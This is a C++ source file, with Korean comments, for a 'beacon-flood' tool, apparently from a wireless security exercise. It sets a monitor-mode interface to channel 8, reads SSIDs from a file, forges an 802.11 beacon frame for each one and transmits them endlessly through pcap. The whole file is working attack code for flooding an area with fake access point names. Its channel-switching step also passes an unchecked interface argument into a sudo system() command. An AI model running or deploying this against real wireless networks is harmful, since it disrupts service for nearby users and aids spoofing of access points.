#include <iostream>
#include <fstream>
#include <pcap.h>
#include <unistd.h>
#include "CRadioHeader.h"
#include "CBeaconFrame.h"
#include "CWirelessManagement.h"
#include "CBeaconFlood.h"

void usage()
{
    std::cerr << "syntax : beacon-flood <interface> <ssid-list-file>" << std::endl;
    std::cerr << "sample : beacon-flood mon0 ssid-list.txt" << std::endl;
}

void printErrorInterface(char* strErr)
{
    std::cerr << strErr << std::endl;
    std::cerr << "Check  Interface Or Permission" << std::endl;
}

void printErrorSSIDFile(char* strFilePath)
{
    std::cerr << strFilePath << "경로의 파일을 읽을 수 없습니다." << std::endl;
    std::cerr << "파일 명과 경로를 확인 후 다시 입력해주세요." << std::endl;
}

bool change80211Channel(char* interface)
{
    std::string command;
    command.append("sudo iwconfig ");
    command.append(interface);
    command.append(" channel 8");
    int res = system(command.c_str());
    if(res == 0)
        return true;
    else
        return false;
}

void printChangeChannelError()
{
    std::cerr << "Can't Cange 802.11 Channel." << std::endl;
}

void sendBeaconFrame(pcap_t* handle, std::vector<std::string> vecSSID ,std::vector<CBeaconFlood> beaconFrame)
{
    for(int i =0; i < beaconFrame.size(); i++)
    {
        u_char* packetD = beaconFrame[i].getFloodPacket();
        int len =  beaconFrame[i].getFloodPacketSize();

        for(int k = 0; k < 1000; k++)
        {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packetD), len);
            if(res != 0)
                std::cerr << "Error Can't Send Packet" << std::endl;
        }
        std::cout << vecSSID[i] << "Packet Send 1000 times." << std::endl;
    }
    sleep(1);
}

int main(int argc, char* argv[])
{
    // 만약 인자로 인터페이스를 제공하지 않았을 경우
    if(argc < 3)
    {
        usage();
        return -1;
    }

    char* interface = argv[1];
    char strErr[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, strErr);
    
    // 해당 인터페이스가 없거나 권한이 없는 경우우
    if(handle == nullptr)
    {
        printErrorInterface(strErr);
        return -1;
    }

    // 받은 SSID List 파일을 열리는지 확인
    std::ifstream ifs(argv[2]);
    if(ifs.fail())
    {
        printErrorSSIDFile(argv[2]);
        return -1;
    }

    // SSID를 담을 벡터
    std::vector<std::string> vecSSIDList;
    std::string strSSID;
    strSSID.resize(255);
    while(ifs.getline(&strSSID[0], 255))
        vecSSIDList.push_back(strSSID);

    ifs.close();
    
    if(!change80211Channel(interface))
    {
        printChangeChannelError();
        return -1;
    }

    // beacon Flooding을 유발할 패킷 리스트
    std::vector<CBeaconFlood> vecBeaconFloodingPacketList;

    for(int i = 0; i < vecSSIDList.size(); i++)
    {
        char* packet;
        // 패킷을 구성하는 클래스 생성
        C80211RadioHeader radioHeader = C80211RadioHeader();
        C80211BeaconFrame beaconFrame = C80211BeaconFrame();
        CWirelessManagement wirelessManagement = CWirelessManagement(strlen(vecSSIDList[i].c_str()));

        // 패킷 길이 정보를 가져온다.
        int strRadioHeaderSize = radioHeader.getFloodPacketSize();
        int strBeaconFrameSize = beaconFrame.getFloodBeaconFrameSize();
        int strWirelessManagementSize = wirelessManagement.getFloodPacketLen();
        int totalPacketByte =  + strRadioHeaderSize + strBeaconFrameSize + strWirelessManagementSize;
        packet = (char*)malloc(totalPacketByte);
        radioHeader.getFloodPacket(packet);
        // for Debugging
        // for(int i =0; i < strRadioHeaderSize; i++)
        //     printf("%02x ", (u_char)packet[i]);
        // std::cout <<std::endl;

        beaconFrame.getFloodBeaconFrame(&packet[strRadioHeaderSize]);
        // for Debugging
        // for(int i = 0; i < strRadioHeaderSize+strBeaconFrameSize; i++)
        //     printf("%02x ", (u_char)packet[i]);
        // std::cout << std::endl;

        wirelessManagement.getFloodPacket(vecSSIDList[i].c_str(), &packet[strRadioHeaderSize+strBeaconFrameSize]);
        // for Debugging
        // for(int i = 0; i < totalPacketByte; i++)
        //     printf("%02x ", (u_char)packet[i]);
        // std::cout << std::endl;

        CBeaconFlood beacon(totalPacketByte, packet);
        vecBeaconFloodingPacketList.push_back(beacon);
        free(packet);
    }

    while(true)
        sendBeaconFrame(handle, vecSSIDList, vecBeaconFloodingPacketList);

    return 0;
}